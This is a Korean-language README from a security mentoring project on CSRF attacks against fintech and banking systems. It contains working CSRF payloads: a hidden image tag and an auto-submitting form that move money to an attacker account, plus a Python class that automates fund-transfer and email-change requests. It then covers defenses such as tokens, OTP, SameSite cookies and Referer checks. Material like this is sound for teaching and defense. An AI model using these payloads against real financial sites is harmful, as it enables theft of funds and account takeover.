# Ye - CSRF 공격 (핀테크 보안)

## 📋 프로젝트 개요

**멘티**: Ye
**희망분야**: 핀테크 보안
**기간**: 2025년 11월
**주제**: CSRF (Cross-Site Request Forgery) 공격 - 핀테크 환경 중심
**멘토링**: 보안 전문가 현직자 멘토링 프로그램

---

## 🎯 학습 목표

1. **핀테크 환경에서의 CSRF 공격 이해**
2. **금융 거래 시스템 취약점 분석**
3. **CSRF 공격 자동화**
4. **핀테크 보안 방어 기법**

---

## 📂 프로젝트 구조

```
Ye/
├── CSRF_공격/
│   ├── 1111_CSRF.py              # 기본 CSRF 공격
│   ├── 1111_CSRF/                # CSRF 실습
│   ├── 1114_CSRF_F/              # CSRF 우회 기법
│   │   ├── 1114_CSRF4.py
│   │   └── 1114_CSRF5.py
│   └── 1116_Dashboard/           # 대시보드 공격
│       └── 1116_CSRF_Dashboard.py
│
└── README.md                      # 이 파일
```

---

## 🔥 핀테크 환경 CSRF 공격

### 공격 시나리오

```
피해자가 온라인 뱅킹에 로그인한 상태
→ 공격자가 만든 악성 페이지 방문
→ 피해자 모르게 송금 요청 전송
→ 계좌에서 돈이 빠져나감
```

### 실제 금융 거래 공격 예시

**공격 코드**:
```html
<!-- 악성 페이지 -->
<html>
<body>
<h1>무료 쿠폰 받기!</h1>
<img src="https://bank.com/transfer?to=attacker&amount=1000000" style="display:none">
</body>
</html>
```

**자동 폼 제출 방식**:
```html
<body onload="document.forms[0].submit()">
<form action="https://bank.com/transfer" method="POST">
    <input type="hidden" name="to" value="attacker_account">
    <input type="hidden" name="amount" value="1000000">
</form>
</body>
```

---

## 💻 공격 도구

### 1116_CSRF_Dashboard.py

**목적**: 금융 대시보드 CSRF 공격 자동화

**핵심 기능**:
- 자동 세션 탐지
- 다중 요청 전송
- 거래 내역 조작

**핵심 코드**:
```python
import requests
from bs4 import BeautifulSoup

class FinTechCSRF:
    def __init__(self, target_url):
        self.target = target_url
        self.session = requests.Session()

    def exploit_transfer(self, to_account, amount):
        """송금 CSRF 공격"""
        # 피해자 세션 쿠키 사용
        payload = {
            'to_account': to_account,
            'amount': amount,
            'submit': 'Transfer'
        }

        # CSRF 토큰 없이 요청
        response = self.session.post(
            f"{self.target}/transfer",
            data=payload
        )

        if "Success" in response.text:
            print(f"[+] Transfer successful: {amount}원")
            return True
        return False

    def exploit_user_info_change(self, new_email):
        """사용자 정보 변경 CSRF"""
        payload = {
            'email': new_email,
            'submit': 'Update'
        }

        response = self.session.post(
            f"{self.target}/profile/update",
            data=payload
        )

        if "Updated" in response.text:
            print(f"[+] Email changed to: {new_email}")
            return True
        return False
```

---

## 🛡️ 핀테크 CSRF 방어 기법

### 1. CSRF 토큰 (필수!)

```php
<?php
session_start();

// 토큰 생성
if (empty($_SESSION['csrf_token'])) {
    $_SESSION['csrf_token'] = bin2hex(random_bytes(32));
}

// 폼에 토큰 포함
?>
<form action="/transfer" method="POST">
    <input type="hidden" name="csrf_token"
           value="<?php echo $_SESSION['csrf_token']; ?>">
    <input type="text" name="to_account">
    <input type="number" name="amount">
    <button type="submit">송금</button>
</form>

<?php
// 요청 검증
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if ($_POST['csrf_token'] !== $_SESSION['csrf_token']) {
        die('CSRF token invalid');
    }

    // 송금 처리
    process_transfer($_POST['to_account'], $_POST['amount']);
}
?>
```

### 2. 추가 인증 (2FA)

```php
<?php
// 중요 거래는 OTP/SMS 추가 인증 필수
function process_transfer($to, $amount) {
    // 일정 금액 이상은 OTP 필요
    if ($amount > 100000) {
        require_otp_verification();
    }

    // 송금 처리
    // ...
}
?>
```

### 3. SameSite 쿠키 속성

```php
<?php
// 세션 쿠키 설정
session_set_cookie_params([
    'lifetime' => 0,
    'path' => '/',
    'domain' => 'bank.com',
    'secure' => true,        // HTTPS only
    'httponly' => true,      // JavaScript 접근 차단
    'samesite' => 'Strict'   // 크로스 사이트 요청 차단
]);

session_start();
?>
```

### 4. Referer 검증

```php
<?php
function verify_referer() {
    $referer = $_SERVER['HTTP_REFERER'] ?? '';
    $allowed_domain = 'https://bank.com';

    if (strpos($referer, $allowed_domain) !== 0) {
        die('Invalid referer');
    }
}

// 중요 액션에서 검증
if ($_POST['action'] === 'transfer') {
    verify_referer();
    // 송금 처리
}
?>
```

---

## 📊 핀테크 CSRF 공격 사례

### Case 1: 계좌 이체 공격

**공격 흐름**:
```
1. 피해자가 은행 사이트 로그인
2. 로그인 상태에서 악성 사이트 방문
3. 악성 사이트에서 자동으로 송금 요청
4. CSRF 토큰 없으면 → 송금 완료
```

**피해 규모**: 계좌 잔액 전체 탈취 가능

### Case 2: 이메일/전화번호 변경

**공격 흐름**:
```
1. 피해자 정보 변경 (이메일, 전화번호)
2. 비밀번호 재설정 링크가 공격자 이메일로 전송
3. 공격자가 계정 탈취
```

**피해 규모**: 계정 완전 장악

### Case 3: 대출 신청

**공격 흐름**:
```
1. 피해자 명의로 대출 신청
2. 대출금이 공격자 계좌로 입금
3. 피해자에게 빚만 남음
```

**피해 규모**: 수천만원 ~ 수억원

---

## 🎓 핵심 교훈

### 1. 금융 거래는 절대 신뢰하지 말 것

```
모든 요청에 추가 검증 필요
→ CSRF 토큰
→ 2FA/OTP
→ 거래 확인 이메일/SMS
```

### 2. 중요도에 따른 보안 레벨 차등 적용

```
조회: 기본 인증
소액 거래: CSRF 토큰
고액 거래: CSRF + OTP
계좌 정보 변경: CSRF + OTP + 이메일 확인
```

### 3. 사용자 교육

```
의심스러운 링크 클릭 금지
금융 사이트 로그인 후 다른 사이트 방문 자제
정기적인 거래 내역 확인
```

---

## 📚 참고 자료

### OWASP
- [OWASP CSRF Guide](https://owasp.org/www-community/attacks/csrf)
- [CSRF Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html)

### 금융 보안 표준
- PCI DSS (Payment Card Industry Data Security Standard)
- 전자금융거래법
- 금융보안원 가이드라인

### 실제 사례
- ING Direct CSRF Attack (2008)
- YouTube CSRF Vulnerability (2008)

---

## ⚠️ 면책 조항

이 자료는 핀테크 보안 연구 및 교육 목적으로만 사용됩니다.
실제 금융 시스템에 무단으로 접근하는 것은 중대한 범죄행위입니다.

**법적 경고**:
- 전자금융거래법 위반 시 최대 10년 이하 징역
- 실제 금융 시스템 공격 절대 금지
- 허가된 테스트 환경에서만 실습할 것

---

**멘티**: Ye
**희망분야**: 핀테크 보안
**학습 기간**: 2025년 11월
**멘토링**: 보안 전문가 현직자 멘토링 프로그램
